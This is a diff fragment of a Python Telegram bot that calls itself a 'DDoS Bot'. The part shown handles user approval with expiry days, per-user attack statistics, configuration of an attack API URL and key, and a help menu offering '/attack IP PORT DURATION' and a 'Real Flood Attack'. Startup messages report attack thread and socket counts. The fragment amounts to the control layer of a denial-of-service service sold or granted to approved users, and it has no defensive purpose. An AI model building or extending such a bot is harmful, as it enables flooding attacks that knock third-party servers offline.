@@ -690,4 +690,174 @@ async def myinfo_cmd(update, context):
     if u.get("approved"):
         exp = u.get("expires_at")
         days = max(0, (make_aware(exp) - get_current_time()).days) if exp else 0
-        txt = f"✅ Approved\nUser: {uid}\nExpires: {days} days\nAttacks: {u.get
+        txt = f"✅ Approved\nUser: {uid}\nExpires: {days} days\nAttacks: {u.get('total_attacks',0)}"
+    else:
+        txt = "❌ Not approved."
+    await update.message.reply_text(txt)
+
+async def mystats_cmd(update, context):
+    uid = update.effective_user.id
+    if not await is_approved(uid):
+        await update.message.reply_text("Not approved.")
+        return
+    s = db.get_user_stats(uid)
+    rate = (s['successful']/s['total']*100) if s['total']>0 else 0
+    txt = f"📊 *Your Stats*\nTotal: {s['total']}\n✅ {s['successful']} | ❌ {s['failed']}\nSuccess: {rate:.1f}%"
+    await update.message.reply_text(txt, parse_mode="Markdown")
+
+async def blocked_ports_cmd(update, context):
+    await update.message.reply_text(f"🚫 Blocked ports: {blocked_ports_str()}")
+
+async def help_cmd(update, context):
+    await update.message.reply_text(
+        "🤖 *Bot Help*\n\n"
+        "• /start - Main menu\n"
+        "• /attack IP PORT DURATION - API attack\n"
+        "• /myinfo - Your account info\n"
+        "• /mystats - Your attack statistics\n"
+        "• /blockedports - Show blocked ports\n\n"
+        "💀 *Real Flood Attack* available in main menu!",
+        parse_mode="Markdown"
+    )
+
+async def setapi_url(update, context):
+    url = update.message.text.strip()
+    if not url.startswith(("http://","https://")):
+        url = "https://" + url
+    context.user_data['api_url'] = url
+    await update.message.reply_text("Now send API Key (or /cancel):")
+    return SETAPI_KEY
+
+async def setapi_key(update, context):
+    key = update.message.text.strip()
+    url = context.user_data.get('api_url')
+    if url and key:
+        db.set_api_config(url, key)
+        await update.message.reply_text(f"✅ API configured!\nURL: {url}\nKey: {key[:10]}...")
+    else:
+        await update.message.reply_text("❌ Invalid. Cancelled.")
+    context.user_data.clear()
+    return ConversationHandler.END
+
+async def approve_uid(update, context):
+    txt = update.message.text.strip()
+    if not txt.isdigit():
+        await update.message.reply_text("Invalid user ID. Send /cancel")
+        return APPROVE_USER
+    context.user_data['approve_uid'] = int(txt)
+    await update.message.reply_text("Enter number of days:")
+    return APPROVE_DAYS
+
+async def approve_days(update, context):
+    days = update.message.text.strip()
+    if not days.isdigit():
+        await update.message.reply_text("Invalid days. /cancel")
+        return APPROVE_DAYS
+    uid = context.user_data.get('approve_uid')
+    days = int(days)
+    if db.approve_user(uid, days):
+        await update.message.reply_text(f"✅ User {uid} approved for {days} days.")
+        try:
+            await context.bot.send_message(uid, f"✅ Your account approved for {days} days!")
+        except:
+            pass
+    else:
+        await update.message.reply_text("❌ Approval failed.")
+    context.user_data.clear()
+    return ConversationHandler.END
+
+async def disapprove_uid(update, context):
+    txt = update.message.text.strip()
+    if not txt.isdigit():
+        await update.message.reply_text("Invalid. /cancel")
+        return DISAPPROVE_USER
+    uid = int(txt)
+    if db.disapprove_user(uid):
+        await update.message.reply_text(f"✅ User {uid} disapproved.")
+        try:
+            await context.bot.send_message(uid, "❌ Your access has been revoked.")
+        except:
+            pass
+    else:
+        await update.message.reply_text("❌ Failed.")
+    context.user_data.clear()
+    return ConversationHandler.END
+
+async def cancel_conv(update, context):
+    context.user_data.clear()
+    await update.message.reply_text("Cancelled.")
+    return ConversationHandler.END
+
+async def error_handler(update, context):
+    logger.error(f"Error: {context.error}")
+    if update and update.effective_message:
+        await update.effective_message.reply_text("❌ An error occurred. Please try again.")
+
+# ============ MAIN FUNCTION ============
+def main():
+    print("=" * 60)
+    print("🤖 Starting DDoS Bot...")
+    print(f"👑 Admins: {ADMIN_IDS}")
+    print(f"⚙️ Attack Threads: {ATTACK_THREADS}")
+    print(f"🔌 Sockets per thread: {SOCKETS_PER_THREAD}")
+    print("=" * 60)
+    
+    app = Application.builder().token(BOT_TOKEN).build()
+    
+    # Conversation handlers
+    setapi_conv = ConversationHandler(
+        entry_points=[CallbackQueryHandler(button_handler, pattern="^admin_setapi$")],
+        states={
+            SETAPI_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setapi_url)],
+            SETAPI_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, setapi_key)]
+        },
+        fallbacks=[CommandHandler("cancel", cancel_conv)],
+    )
+    
+    approve_conv = ConversationHandler(
+        entry_points=[CallbackQueryHandler(button_handler, pattern="^admin_approve$")],
+        states={
+            APPROVE_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, approve_uid)],
+            APPROVE_DAYS: [MessageHandler(filters.TEXT & ~filters.COMMAND, approve_days)]
+        },
+        fallbacks=[CommandHandler("cancel", cancel_conv)],
+    )
+    
+    disapprove_conv = ConversationHandler(
+        entry_points=[CallbackQueryHandler(button_handler, pattern="^admin_disapprove$")],
+        states={
+            DISAPPROVE_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, disapprove_uid)]
+        },
+        fallbacks=[CommandHandler("cancel", cancel_conv)],
+    )
+    
+    # Command handlers
+    app.add_handler(CommandHandler("start", start_cmd))
+    app.add_handler(CommandHandler("attack", attack_cmd))
+    app.add_handler(CommandHandler("myinfo", myinfo_cmd))
+    app.add_handler(CommandHandler("mystats", mystats_cmd))
+    app.add_handler(CommandHandler("blockedports", blocked_ports_cmd))
+    app.add_handler(CommandHandler("help", help_cmd))
+    
+    # Callback handlers
+    app.add_handler(CallbackQueryHandler(button_handler, pattern="^(attack_menu|attack_flood_menu|flood_|myinfo|mystats|blockedports|help|admin_panel|back_main|admin_users|admin_stats|admin_status|admin_blockedports|admin_attack_settings|inc_threads|dec_threads|stop_attack|info_attack|refresh_attack)$"))
+    
+    # Conversation handlers
+    app.add_handler(setapi_conv)
+    app.add_handler(approve_conv)
+    app.add_handler(disapprove_conv)
+    
+    # Message handler for flood input
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_flood_input))
+    
+    # Error handler
+    app.add_error_handler(error_handler)
+    
+    print("✅ Bot is LIVE! Send /start on Telegram")
+    print("=" * 60)
+    
+    app.run_polling(allowed_updates=Update.ALL_TYPES)
+
+# ============ RUN BOT ============
+if __name__ == "__main__":
+    main()
